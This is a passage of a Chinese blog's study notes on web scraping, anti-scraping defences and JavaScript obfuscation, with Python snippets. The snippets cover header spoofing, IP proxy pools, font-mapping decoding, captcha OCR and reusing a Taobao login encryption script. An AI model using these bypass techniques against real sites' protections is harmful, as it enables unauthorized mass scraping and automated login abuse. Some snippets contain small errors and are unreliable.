title="Application面板"></a>Application面板</h3><p>可以查看和删除Cookie，但是不能修改Cookie值。</p><p>使用localstorage本地存储来存储键值对，可以在其中进行键值对的检查修改和删除操作</p><ul><li>setItem()：存储一个名称为key的值value，如果value存在就更新</li><li>getItem()：获取名称为key的value值，如果key不存在就null</li><li>removeItem()：删除名称为key的信息，</li><li>clear()：清空localstorage所有信息</li><li>key()：键的索引</li></ul><h3 id="js逆向技巧"><a href="#js逆向技巧" class="headerlink" title="js逆向技巧"></a>js逆向技巧</h3><p>全局搜索：ctrl+shift+F</p><p>console插桩：条件表达式中添加console.log</p><p>复制console面板：</p><ul><li>copy()</li><li>JSON:stringify()</li><li>Object.toString()</li><li>CryptoJS.enc.Utf8.stringify() 需要在snippets添加CryptoJS加密库</li></ul><h2 id="本地覆盖"><a href="#本地覆盖" class="headerlink" title="本地覆盖"></a>本地覆盖</h2><p>Chrome中</p><ul><li>source面板中切换到替换，选择要进行替换的文件夹，在网络面板中找到某个请求进行替换Save foroverrides菜单项</li><li>fiddler自动响应<img src="2025-01-15-AST混淆与反混淆/image-20241112212044355.png" alt="image-20241112212044355"></li></ul><h1 id="爬虫与反爬虫"><a href="#爬虫与反爬虫" class="headerlink" title="爬虫与反爬虫"></a>爬虫与反爬虫</h1><p>完整爬虫流程：</p><ul><li>发起一次http请求</li><li>服务站点进行一次响应</li><li>对返回信息进行数据解析与清洗</li><li>数据存储到数据库或者本地文件</li></ul><p><img src="2025-01-15-AST混淆与反混淆/image-20241112213016930.png" alt="image-20241112213016930"></p><h2 id="网络请求"><a href="#网络请求" class="headerlink" title="网络请求"></a>网络请求</h2><h3 id="发送请求"><a href="#发送请求" class="headerlink" title="发送请求"></a>发送请求</h3><p>http请求报文主要是四部分：请求行，请求头部，空行和请求体<img src="2025-01-15-AST混淆与反混淆/image-20241112213004971.png" alt="image-20241112213004971"></p><h4 id="请求行"><a href="#请求行" class="headerlink" title="请求行"></a>请求行</h4><p>主要有作用的是：请求方法，统一资源定位符，http协议版本</p><p>8中请求方法</p><ol><li>GET：向目标服务器请求资源，返回实体主体</li><li>POST：向目标服务器发送资源，例如提交表达</li><li>HEAD：与get类似，不过他用于获取报头，不会返回具体内容</li><li>PUT：向目标服务器发送数据以覆盖指定内容</li><li>DELETE：请求服务器删除URL指定内容</li><li>OPTIONS：返回目标服务器针对特定资源的HTTP请求方法</li><li>TRACE：用于测试诊断，回显服务器收到的请求</li><li>CONNECT：HTTP1.1协议预留给能够将链接修改为管道方式的代理服务器</li></ol><p><strong>Http1.0中只有前三种请求方法</strong></p><p>GET用于获取网页资源，POST常用来模拟登录</p><p>请求行中的<strong>统一资源定位符</strong>实际上就是<strong>URL</strong></p><h4 id="请求头部"><a href="#请求头部" class="headerlink" title="请求头部"></a>请求头部</h4><p>请求头部主要由一系列键值对组成，用来说明服务器需要的附属信息，通常反爬虫就是在请求头部里进行，检测是否包含关键键值对，如果不存在或者数据不匹配就会被判定为机器人</p><p>常用8个键值对</p><ol><li>Accept-Charset：客户端可以接受的字符集</li><li>Cookie：网站用来识别身份所用的加密键值对，需要登录才能访问的网站通常需要携带</li><li>Connection：表示是否需要持久连接，close代表本次响应后连接可以被关闭</li><li>Content-Type：请求体数据类型</li><li>Content-Length：请求体的长度</li><li>Host：请求的主机名</li><li>Referer：指明用户从该URL出发到达此页面，常用于防盗链技术</li><li>User-Agent：服务器用来识别浏览器类型，可更改这个参数达到切换计算机端与手机端的效果</li></ol><h4 id="空行"><a href="#空行" class="headerlink" title="空行"></a>空行</h4><p>必须存在于http请求头部之后，也就是输入“\n\r”，他的作用在于通知目标服务器此后不会再出现请求头部，将进入请求体。</p><h4 id="请求体"><a href="#请求体" class="headerlink" title="请求体"></a>请求体</h4><p>在GET方法中一般不存在请求体，请求体适用于POST方法，内容是用户在填写表单时提交的数据，他的格式是用&amp;连接的键值对，如name=test&amp;password=123。</p><h3 id="解析响应"><a href="#解析响应" class="headerlink" title="解析响应"></a>解析响应</h3><p>返回的http响应报文包含了客户端需要的数据，一般可以通过观察报文中的一些关键信息来确认响应的实际情况，http响应报文结构：<img src="2025-01-15-AST混淆与反混淆/image-20241112231535605.png" alt="image-20241112231535605"></p><p>四个部分：状态行，响应头，空行，响应体。</p><p>状态行中包括状态码和状态码描述。</p><h4 id="响应行"><a href="#响应行" class="headerlink" title="响应行"></a>响应行</h4><p>状态码state code主要由三位数字构成，第一位数字用来辨别响应类型，后两位用来区分</p><ul><li>1xx：服务器成功接收客户端请求，客户端可继续发请求</li><li>2xx：服务器成功接收请求，并着手进行处理</li><li>3xx：服务器要求客户端重定向</li><li>4xx：服务器表明客户端请求非法</li><li>5xx：服务器发生错误</li></ul><p>熟记的10种状态码：省略</p><h4 id="响应头"><a href="#响应头" class="headerlink" title="响应头"></a>响应头</h4><p>不必对其有太多理解，偶尔观察几个键值对辅证响应状态码的描述。</p><ol><li>Location：在301或者302下返回的重定向后的url地址</li><li>Connect：close表示本次响应后连接将被关闭；keepalive表示长久连接，服务器会等待客户端下次请求</li><li>Server：服务器用来处理请求的软件信息及其版本，与http请求中User-agent类似，不过它代表服务器端信息</li></ol><h4 id="空行-1"><a href="#空行-1" class="headerlink" title="空行"></a>空行</h4><p>响应头后必须加入“\n\r”，他的作用表示接下来进入响应体</p><h4 id="响应体"><a href="#响应体" class="headerlink" title="响应体"></a>响应体</h4><h2 id="网络爬虫分类"><a href="#网络爬虫分类" class="headerlink" title="网络爬虫分类"></a>网络爬虫分类</h2><p>网络爬虫分为通用网络爬虫，聚焦网络爬虫，增量式网络爬虫，深层网络爬虫</p><h3 id="通用网络爬虫"><a href="#通用网络爬虫" class="headerlink" title="通用网络爬虫"></a>通用网络爬虫</h3><p>又叫全网爬虫，它的目标是整个互联网，爬取数据丰富，常用语搜索引擎中。往往从一个url开始，辗转爬取，最终拓展到整个网络。</p><p>深度优先爬取策略和广度优先爬取策略较为常见</p><ul><li>深度优先爬取策略：按照页面深度进行排序，一次访问一级URL，直到触底无法深入</li><li>广度优先爬取策略：按照页面内容目录层次进行划分，爬取完同一层次的URL才会继续下一层进行爬取</li></ul><h3 id="聚焦网络爬虫"><a href="#聚焦网络爬虫" class="headerlink" title="聚焦网络爬虫"></a>聚焦网络爬虫</h3><p>更适用于日常爬虫的需要，并不需要爬取整个互联网数据，它专注于某一主题，选择性的爬取网页上与开发者定义的规则相匹配的数据资源</p><p>四种爬取策略</p><ol><li>基于内容评价：将用户输入的信息作为主题进行爬取，页面包含用户输入信息则认为与主题有关</li><li>基于链接评价：根据页面结构信息分析爬取的url的重要性，根据重要程度进行爬取优先级的排序</li><li>基于增强学习：利用概率统计中的贝叶斯分类器，根据网页内容和链接文本对URL进行分类，计算出URL的权重，来决定爬取顺序</li><li>基于语境图：结合机器学习系统，计算当前页面到相关的页面的距离，距离越近的页面的URL则越优先访问</li></ol><h3 id="增量式网络爬出"><a href="#增量式网络爬出" class="headerlink" title="增量式网络爬出"></a>增量式网络爬出</h3><p>主要目的是长久的维持一个数据库，对数据的稳健性和实时性具有高要求，再次爬取时就会只爬取新出现的或者发生改变的数据，对于没有发生变化的页面或者数据不会爬取</p><p>三种常用策略</p><ol><li>统一更新：每隔一段时间将所有页面再访问一遍，以达到更新数据的目的</li><li>个体更新：根据个体网站的数据变化频率来指定重新访问时间</li><li>分类更新：将网页区分为数据变化迅速的和数据变化缓慢的，以不同频率访问这两类网页</li></ol><h3 id="深层网络爬虫"><a href="#深层网络爬虫" class="headerlink" title="深层网络爬虫"></a>深层网络爬虫</h3><p>主要指的是没法直接访问的页面，这类页面信息通常要满足一定的要求才可以浏览，他隐藏在一些表单之后，不能通过静态链接直接获取。例如一些必须登录，注册后才能访问的网站。这类爬虫只需要搭配get和post请求就可以访问，难点在于破解post提交信息时的网页数据加密</p><p>两种策略</p><ol><li>基于领域知识：维护一个本地的词库，通过语义分析来选取合适的关键词填写表单</li><li>基于网页结构分析：在领域知识欠缺的情况下，根据网页结构进行分析，并自动填写表单</li></ol><h2 id="编写网络爬虫"><a href="#编写网络爬虫" class="headerlink" title="编写网络爬虫"></a>编写网络爬虫</h2><h3 id="requests请求库使用"><a href="#requests请求库使用" class="headerlink" title="requests请求库使用"></a>requests请求库使用</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://www.baidu.com/&quot;</span></span><br><span class="line"></span><br><span class="line">headers=&#123;<span class="string">&quot;user-agent&quot;</span>:</span><br><span class="line"><span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36&quot;</span>&#125;</span><br><span class="line">response=requests.get(url,headers=headers)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure><h3 id="bs4解析库使用"><a href="#bs4解析库使用" class="headerlink" title="bs4解析库使用"></a>bs4解析库使用</h3><p>‘.’对应class属性，‘#’对应id属性</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line">url=<span class="string">&quot;http://www.baidu.com/&quot;</span></span><br><span class="line"></span><br><span class="line">headers=&#123;<span class="string">&quot;user-agent&quot;</span>:</span><br><span class="line"><span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36&quot;</span>&#125;</span><br><span class="line">response=requests.get(url,headers=headers)</span><br><span class="line"><span class="comment">#print(response.text)</span></span><br><span class="line">soup=BeautifulSoup(response.text,<span class="string">&#x27;lxml&#x27;</span>) <span class="comment">#lxml是一个解析器</span></span><br><span class="line">btn=soup.select_one(<span class="string">&#x27;#su&#x27;</span>) <span class="comment">#定位采用CSS选择器 定位精确 简便</span></span><br><span class="line"><span class="built_in">print</span>(btn[<span class="string">&#x27;value&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#因为bs4返回的节点都是python对象，所以获取html标签中的元素只需像python中获取字典形式一样去获取</span></span><br></pre></td></tr></table></figure><p>从请求角度，反爬虫可以在http数据包中进行</p><ol><li>要求用户注册登录才能查看数据，发包形式为GET与POST混合</li><li>添加User-Agent，Referer或者Cookie头部校验</li><li>增加验证码，将请求包中的参数进行js加密</li></ol><p>从数据角度，反爬虫可以通过阻碍爬虫开发者查看网页源代码来进行</p><ol><li>禁止用户右击或者f12</li><li>添加控制台反调试，使用无限循环debugger妨碍调试者</li><li>改变数据加载方式，使用Ajax动态加载</li><li>进行数据加密，返回的数据通过脚本文件解密后再展示</li><li>对加密脚本进行混淆，让爬虫者无法阅读源代码</li></ol><p>爬虫开发者与网站开发者对抗的<strong>五个阶段</strong></p><p><img src="2025-01-15-AST混淆与反混淆/image-20241113144740357.png" alt="image-20241113144740357"></p><h1 id="常规反爬虫技巧"><a href="#常规反爬虫技巧" class="headerlink" title="常规反爬虫技巧"></a>常规反爬虫技巧</h1><h2 id="Headers头部校验"><a href="#Headers头部校验" class="headerlink" title="Headers头部校验"></a>Headers头部校验</h2><p>对头部的三个主要键值对进行判断</p><ol><li>User-Agent：检测请求者的用户代理，此项缺失则判定为机器人</li><li>Referer：检测请求者是否以正常途径跳转到本页面，常用于防盗链技术</li><li>Cookie：检测请求者身份状态，需要登录才能访问的网站通常需要携带</li></ol><p>应对方法：直接复制请求头中相应键值对，需注意：需要登录才能访问的网站，Cookie有时效性，需要及时更新</p><p><strong>cookie传递</strong></p><p>需要登录才能获取网页数据，或者需要跨请求保持参数时，可以用session对象，自动管理Cookie，当用户登录一个页面，它可以自动识别response中Set-Cookie键值对，为后续请求维持这个Cookie来保持会话信息</p><p>下面是POST+GET例子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment">#使用session共享cookie</span></span><br><span class="line">url=<span class="string">&quot;http://www.test.com/login&quot;</span></span><br><span class="line">data=&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;test&quot;</span>,<span class="string">&quot;password&quot;</span>:<span class="string">&quot;12345&quot;</span>&#125;</span><br><span class="line">headers=&#123;<span class="string">&quot;User-Agent&quot;</span>:<span class="string">&quot;xxxxx&quot;</span>&#125;</span><br><span class="line">session=requests.session()</span><br><span class="line">session.headers=headers</span><br><span class="line">post_html=session.post(url,data=data) <span class="comment">#模拟登录</span></span><br><span class="line">get_html=session.get(<span class="string">&quot;http://www.test.com/get&quot;</span>) <span class="comment">#传递Cookie进行信息获取</span></span><br><span class="line"><span class="built_in">print</span>(get_html.text)</span><br></pre></td></tr></table></figure><h2 id="IP地址记录"><a href="#IP地址记录" class="headerlink" title="IP地址记录"></a>IP地址记录</h2><p>防止短时间内大量发起http请求</p><p>这种反爬虫手段原理是检测异常访问的用户，如果有请求在短时间内连续访问网站数十次，对ip进行记录，判定为机器人，当该ip再次发起请求，响应403。</p><p>应对方法：</p><p>减缓http请求间隔，或者建立ip代理池，在进行请求时使用ip代理，被检测后更换ip即可。</p><p><strong>案例：豆瓣网站</strong></p><p><strong>1.用户延迟访问</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DelayRequests</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,delay=<span class="number">3</span></span>):</span><br><span class="line">        <span class="variable language_">self</span>.delay = delay</span><br><span class="line">        <span class="variable language_">self</span>.urls=&#123;&#125;</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">wait</span>(<span class="params">self,url</span>):</span><br><span class="line">        netloc=parse.urlparse(url).netloc</span><br><span class="line">        <span class="built_in">print</span>(netloc)</span><br><span class="line">        lastone=<span class="variable language_">self</span>.urls.get(netloc,<span class="literal">False</span>)</span><br><span class="line">        <span class="built_in">print</span>(lastone)</span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.delay&gt;<span class="number">0</span> <span class="keyword">and</span> lastone:</span><br><span class="line">            sleeptime=<span class="variable language_">self</span>.delay-(datetime.now()-lastone).seconds</span><br><span class="line">            <span class="keyword">if</span> sleeptime&gt;<span class="number">0</span>:</span><br><span class="line">                time.sleep(sleeptime)</span><br><span class="line">        <span class="variable language_">self</span>.urls[netloc]=datetime.now()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>记录爬取过的网站域名，如果下一次访问与上一次访问域名相同，且间隔在设置的延迟时间内，就让爬虫沉睡知道延迟时间跑满</p><p><strong>2.构建IP代理池</strong></p><p>爬取某快代理网站的免费代理，构建IP代理池的代码方案</p><p>网站的翻页url数字递增加一</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line"><span class="comment">#所获取代理是否可用</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">verify</span>(<span class="params">proxy</span>): </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.get(<span class="string">&quot;要访问的目标url&quot;</span>, proxies=proxy, timeout=<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;获取可用代理&#123;&#125;&quot;</span>.<span class="built_in">format</span>(proxy))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;&#123;&#125;不可用代理&quot;</span>.<span class="built_in">format</span>(proxy))</span><br><span class="line">        </span><br><span class="line"><span class="comment">#获取代理</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_proxy</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">        url=<span class="string">&#x27;http://www.kuaidaili.com/free/inha/&#123;&#125;&#x27;</span>,<span class="built_in">format</span>(i)</span><br><span class="line">        response =requests.get(url)</span><br><span class="line">        soup=BeautifulSoup(response)</span><br><span class="line">        datas=soup.select(<span class="string">&#x27;tbody tr&#x27;</span>)</span><br><span class="line">        proxies=&#123;<span class="string">&#x27;http&#x27;</span>:<span class="string">&#x27;http://localhost:8888&#x27;</span>,</span><br><span class="line">                 <span class="string">&#x27;https&#x27;</span>: <span class="string">&#x27;http://localhost:8888&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> data <span class="keyword">in</span> datas:</span><br><span class="line">            ip=data.select(<span class="string">&#x27;td&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">            port=data.select(<span class="string">&#x27;td&#x27;</span>)[<span class="number">1</span>]</span><br><span class="line">            proxy=<span class="string">&quot;http://&quot;</span>+ip.text+<span class="string">&quot;:&quot;</span>+port.text</span><br><span class="line">            proxies[<span class="string">&#x27;http&#x27;</span>]=proxy</span><br><span class="line">            proxies[<span class="string">&#x27;https&#x27;</span>] = proxy</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Get proxy&quot;</span>,<span class="string">&quot;IP:&quot;</span>,ip.text,<span class="string">&quot;Port:&quot;</span>,port.text)</span><br><span class="line">            verify(proxies)</span><br></pre></td></tr></table></figure><h2 id="Ajax异步加载"><a href="#Ajax异步加载" class="headerlink" title="Ajax异步加载"></a>Ajax异步加载</h2><p>简单来说就是在访问一个页面时，URL本身没有发生变化，页面内容却发生了动态更新。这时，直接使用get请求去获取网站内容是定位不到具体内容的，因为他的获取一般是经由数据接口进行返回的</p><p>面对此类技术只需要网页抓包，在大量数据包中寻找真正包含网页内容的数据接口即可。因为数据如果渲染到页面就一定会有数据包将其传输到客户端，此类技术进行数据传输返回的结果都是JSON格式，用JSON包进行数据解析。JSON格式所以不需要bs4解析DOM语法树</p><h2 id="字体反爬虫"><a href="#字体反爬虫" class="headerlink" title="字体反爬虫"></a>字体反爬虫</h2><p>对数据进行反爬虫操作。要获取的网页数据在浏览器中正常查看，将其复制到本地就会乱码，他的原理是网站自定义创造一套字体，构建映射关系后将其添加到css的font中，在浏览器中查看网站会自动获取这些文件从而建立对应关系映射得到字符，爬虫时，映射文件空缺，没有字符集解字符，导致乱码</p><p>应对两个方法：</p><ol><li>找到font文件的url地址，将其下载到本地后使用xml解析工具解析，然后根据其中字符对应关系，建立本地映射进行字符替换</li><li>手动复制其中加密字符，在本地encode编码，建立自己的本地映射字典，然后进行字符爬取替换</li></ol><p><strong>案例：实习僧python岗位</strong></p><p><img src="2025-01-15-AST混淆与反混淆/image-20241113163522007.png" alt="image-20241113163522007"></p><p><img src="2025-01-15-AST混淆与反混淆/image-20241113163535965.png" alt="image-20241113163535965"></p><p>发现确实有一些是乱码，</p><p><strong>采用第二种方法:</strong>首先复制单个无法显示字符，encode编码，这里以1-3为例</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line">one=<span class="string">&#x27; &#x27;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">two=<span class="string">&#x27; &#x27;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">three=<span class="string">&#x27; &#x27;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">headers=&#123;<span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;xxxxx&#x27;</span>&#125;</span><br><span class="line">response=requests.get(<span class="string">&#x27;目标url&#x27;</span>，headers=headers)</span><br><span class="line">soup=BeautifulSoup(response.text,<span class="string">&#x27;lxml&#x27;</span>)</span><br><span class="line">salary=soup.select(<span class="string">&#x27;span.day.font&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> salary:</span><br><span class="line">    number=s.text.encode(<span class="string">&#x27;utf-8&#x27;</span>).replace(one,<span class="string">b&#x27;1&#x27;</span>).replace(two,<span class="string">b&#x27;2&#x27;</span>).replace(three,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(number.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure><h2 id="验证码反爬虫"><a href="#验证码反爬虫" class="headerlink" title="验证码反爬虫"></a>验证码反爬虫</h2><p>验证码防护两个阶段：登录注册阶段和访问页面阶段</p><p>如果突破了登录注册阶段，发现一ip短时间多次访问，不会直接封ip，而是出现验证码，防止误伤正常用户，</p><p>训练大模型的网络爬虫可以突破验证码，所以开发者会在验证码背后加上js参数加密，提高难度。不过使用特殊工具selenium可以直接搭配模型模拟人类行为通过验证码，无须破解js参数加密</p><p>对于英数验证码，使用光学字符识别直接识别英数验证码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> pytesseract</span><br><span class="line">image=Image.<span class="built_in">open</span>(<span class="string">&quot;1234.png&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(pytesseract,image_to_string(image))</span><br></pre></td></tr></table></figure><h2 id="JS参数加密"><a href="#JS参数加密" class="headerlink" title="JS参数加密"></a>JS参数加密</h2><p>常用于post表单提交，主要是为了防范恶意机器人批量注册与模拟登录等行为，如果对POST表单进行抓包会发现在表单里输入的数据被加密成了不可知的字符串，这主要是通过加载网站的本地JS脚本实现的</p><p>应对方法：</p><ol><li>简单的加密可以直接使用python语言进行复现</li><li>较复杂一些的加密可以将具体函数提取出来，组成加密脚本后模拟运行</li></ol><p>淘宝登录案例中：</p><p>找到加密js代码，命名为password2.js保存在本地，并编写getPwd接口用于python调用</p><p><img src="2025-01-15-AST混淆与反混淆/image-20241113202428075.png" alt="image-20241113202428075"></p><p>最后通过python调用这个js脚本，获取加密结果</p><p>(execjs用于python调用js)</p><p><img src="2025-01-15-AST混淆与反混淆/image-20241113202553906.png" alt="image-20241113202553906"></p><h2 id="JS反调试"><a href="#JS反调试" class="headerlink" title="JS反调试"></a>JS反调试</h2><p>最简单的：检测是否打开开发者工具或者是否修改本地JS脚本文件，从而判断是否进行无限debugger的卡顿，让攻击者无法调试。</p><p>这种反爬虫的破解可以通过JS Hook</p><p>对于无限循环debugger应对：</p><ol><li>在debugger设置条件断点写入false</li><li>本地覆盖：在使用本地覆盖时，发现这个JS文件名字是VMXXX，显然不是正常的js脚本文件。因为当Ajax加载html内容时，如果包含script标签，Chrome就会自动对脚本进行eval()运算，并被Chrome的source面板识别为VM开头的新文件，转到网络面板，找到Ajax请求，原始的js会存放在响应里，然后本地去除其中的debugger或者反调试函数，将修改过的文件返回回去。</li></ol><h2 id="AST混淆反爬虫"><a href="#AST混淆反爬虫" class="headerlink" title="AST混淆反爬虫"></a>AST混淆反爬虫</h2><p>把代码进行ast混淆，转化为不可阅读，不可识别却能正常运作的乱码文件。</p><h1 id="混淆js手动逆向方法"><a href="#混淆js手动逆向方法" class="headerlink" title="混淆js手动逆向方法"></a>混淆js手动逆向方法</h1><p><strong>基本步骤</strong></p><ul><li>定位加密入口</li><li>混淆特征分析</li><li>加密函数还原</li></ul><h2 id="数组混淆和数组乱序"><a href="#数组混淆和数组乱序" class="headerlink" title="数组混淆和数组乱序"></a>数组混淆和数组乱序</h2><p>数组混淆是将全脚本的所有字符串进行提取加密，在js脚本头部组成加密字符串数组，之后的字符串调用将以获取数组的形式获取字符串，但是字符串位置固定，所以数组混淆和数组乱序通常搭配使用。</p><p>数组混淆的特征是，混淆脚本头部会存一个较长的字符串加密数组；数组乱序的特征是代码中包含push和shift字符串，用于打乱数组顺序</p><h2 id="字符串加密"><a href="#字符串加密" class="headerlink" title="字符串加密"></a>字符串加密</h2><p>比较常用的事base64加密，特征是脚本中会存在atob方法，用于base64加密文本的解密。</p><h2 id="字符串花指令"><a href="#字符串花指令" class="headerlink" title="字符串花指令"></a>字符串花指令</h2><p>是一些无用的代码，主要为了增加破解难度，最常见的字符串花指令就是四则运算的改写</p><h2 id="switch流程控制平坦化"><a href="#switch流程控制平坦化" class="headerlink" title="switch流程控制平坦化"></a>switch流程控制平坦化</h2><p>会把原先的代码执行链拆分为switch判断的多循环结构，作为switch执行的分发器，然后将原本的代码改写为switch形式，按照分发器的顺序进行case判断。最显著特征为存在一个循环的while结构，其中包含多个以数组为判断条件的case结构，在他上面的变量声明一般为分发器</p><h1 id="JS代码安全防护原理"><a href="#JS代码安全防护原理" class="headerlink" title="JS代码安全防护原理"></a>JS代码安全防护原理</h1><h2 id="常量的混淆"><a href="#常量的混淆" class="headerlink" title="常量的混淆"></a>常量的混淆</h2><h3 id="对象属性的两种访问方式"><a href="#对象属性的两种访问方式" class="headerlink" title="对象属性的两种访问方式"></a>对象属性的两种访问方式</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">People</span>(<span class="params">name</span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span>=name;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">People</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">sayHello</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Hello&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> p = <span class="keyword">new</span> <span class="title class_">People</span>(<span class="string">&quot;zxk1ng&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(p.<span class="property">name</span>);</span><br><span class="line">p.<span class="title function_">sayHello</span>();</span><br><span class="line"><span class="comment">//简单混淆</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(p[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">p[<span class="string">&#x27;sayHello&#x27;</span>]();</span><br><span class="line"></span><br><span class="line"><span class="comment">//在JavaScript中，prototype 是一个特殊的属性，它与构造函数（constructor）和对象实例（instances）之间的关系有关。这个属性主要用于实现继承和共享方法。每个 JavaScript 函数都有一个 prototype 属性，它是一个指向对象的引用。当你创建一个新的对象实例时，这个实例会继承其构造函数的 prototype 对象上的属性和方法。</span></span><br></pre></td></tr></table></figure><p>JS中，很多内置对象都是window的属性，代码中定义的全局变量都是全局对象window的属性，定义的全局函数都是全局对象window的方法，全局对象的属性或者方法在调用时可以省略全局对象名。[]形式调用则不能省略，如</p><p><code>new window.Date() == new Date() == new window[&#39;Date&#39;]()</code></p><h3 id="十六进制字符串"><a href="#十六进制字符串" class="headerlink" 